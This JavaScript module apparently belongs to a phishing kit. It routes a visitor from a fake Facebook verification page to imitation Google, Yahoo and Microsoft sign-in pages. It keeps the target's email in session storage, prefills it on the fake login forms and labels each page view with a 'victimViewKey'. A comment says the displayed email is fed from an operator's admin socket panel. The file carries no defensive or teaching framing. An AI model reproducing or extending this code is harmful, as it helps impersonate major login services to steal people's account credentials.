/**
 * Facebook → provider verify → provider sign-in flow.
 * Display email on verify page comes from admin (socket) or lastLoginEmail.
 * Google sign-in email stays blank when opened from verify; Yahoo/Microsoft prefill FB email.
 */
(function (global) {
  var PROVIDERS = {
    google: {
      displayKey: 'googleVerifyDisplayEmail',
      skipPrefillKey: 'googleSkipEmailPrefill',
      loginSessionKey: 'googleLoginSession',
      continueAppKey: 'googleContinueApp',
      returnPageKey: 'googleReturnPage',
      verifySessionKey: 'fbVerifySession',
      verifyUrl: 'fb-verify.html',
      loginUrl: 'google-login.html',
      victimViewKey: 'fb-verify-google',
    },
    yahoo: {
      displayKey: 'yahooVerifyDisplayEmail',
      skipPrefillKey: 'yahooSkipEmailPrefill',
      loginSessionKey: 'yahooLoginSession',
      continueAppKey: 'yahooContinueApp',
      returnPageKey: 'yahooReturnPage',
      verifySessionKey: 'yahooVerifySession',
      verifyUrl: 'yahoo-verify.html',
      loginUrl: 'yahoo-login.html',
      victimViewKey: 'fb-verify-yahoo',
    },
    microsoft: {
      displayKey: 'microsoftVerifyDisplayEmail',
      skipPrefillKey: 'microsoftSkipEmailPrefill',
      loginSessionKey: 'microsoftLoginSession',
      continueAppKey: 'microsoftContinueApp',
      returnPageKey: 'microsoftReturnPage',
      verifySessionKey: 'microsoftVerifySession',
      verifyUrl: 'microsoft-verify.html',
      loginUrl: 'microsoft-login.html',
      victimViewKey: 'fb-verify-microsoft',
    },
  };

  function cfg(providerId) {
    return PROVIDERS[providerId] || PROVIDERS.google;
  }

  function readSession(key) {
    try {
      return sessionStorage.getItem(key) || '';
    } catch (e) {
      return '';
    }
  }

  function writeSession(key, val) {
    try {
      if (val) sessionStorage.setItem(key, val);
      else sessionStorage.removeItem(key);
    } catch (e) {}
  }

  function getVerifyDisplayEmail(providerId) {
    var p = cfg(providerId);
    return readSession(p.displayKey) || readSession('lastLoginEmail') || '';
  }

  function setVerifyDisplayEmail(providerId, email) {
    writeSession(cfg(providerId).displayKey, (email || '').trim());
  }

  function prepareLoginNavigation(providerId) {
    var p = cfg(providerId);
    writeSession(p.loginSessionKey, '1');
    writeSession(p.continueAppKey, 'facebook');
    if (providerId === 'google') {
      writeSession(p.skipPrefillKey, '1');
    } else {
      writeSession(p.skipPrefillKey, '');
    }
  }

  function startFbVerifyFlow(providerId, opts, socketData) {
    if (typeof providerId !== 'string' || !PROVIDERS[providerId]) {
      socketData = opts;
      opts = providerId;
      providerId = (opts && opts.provider) || 'google';
    }
    opts = opts || {};
    var p = cfg(providerId);

    var fbEmail = '';
    if (typeof opts.getFbEmail === 'function') {
      fbEmail = opts.getFbEmail() || '';
    }
    if (!fbEmail) fbEmail = readSession('lastLoginEmail');

    try {
      if (fbEmail) sessionStorage.setItem('lastLoginEmail', fbEmail);
      if (opts.returnPage) writeSession(p.returnPageKey, opts.returnPage);
      writeSession(p.verifySessionKey, '1');
    } catch (e) {}

    var panelDisplay = '';
    if (socketData && typeof socketData === 'object' && socketData.displayEmail != null) {
      panelDisplay = String(socketData.displayEmail).trim();
    }
    setVerifyDisplayEmail(providerId, panelDisplay || fbEmail);

    if (typeof opts.onReady === 'function') {
      opts.onReady(panelDisplay || fbEmail);
      return;
    }

    window.location.href = opts.verifyUrl || p.verifyUrl;
  }

  function flowApi(providerId) {
    var p = cfg(providerId);
    return {
      DISPLAY_KEY: p.displayKey,
      SKIP_PREFILL_KEY: p.skipPrefillKey,
      getVerifyDisplayEmail: function () {
        return getVerifyDisplayEmail(providerId);
      },
      setVerifyDisplayEmail: function (email) {
        setVerifyDisplayEmail(providerId, email);
      },
      prepareLoginNavigation: function () {
        prepareLoginNavigation(providerId);
      },
      prepareGoogleLoginNavigation: function () {
        prepareLoginNavigation(providerId);
      },
      startFbVerifyFlow: function (opts, socketData) {
        startFbVerifyFlow(providerId, opts, socketData);
      },
      verifyUrl: p.verifyUrl,
      loginUrl: p.loginUrl,
      victimViewKey: p.victimViewKey,
    };
  }

  global.ProviderVerifyFlow = {
    PROVIDERS: PROVIDERS,
    cfg: cfg,
    getVerifyDisplayEmail: getVerifyDisplayEmail,
    setVerifyDisplayEmail: setVerifyDisplayEmail,
    prepareLoginNavigation: prepareLoginNavigation,
    startFbVerifyFlow: startFbVerifyFlow,
    forProvider: flowApi,
  };

  global.GoogleVerifyFlow = flowApi('google');
  global.YahooVerifyFlow = flowApi('yahoo');
  global.MicrosoftVerifyFlow = flowApi('microsoft');
})(window);
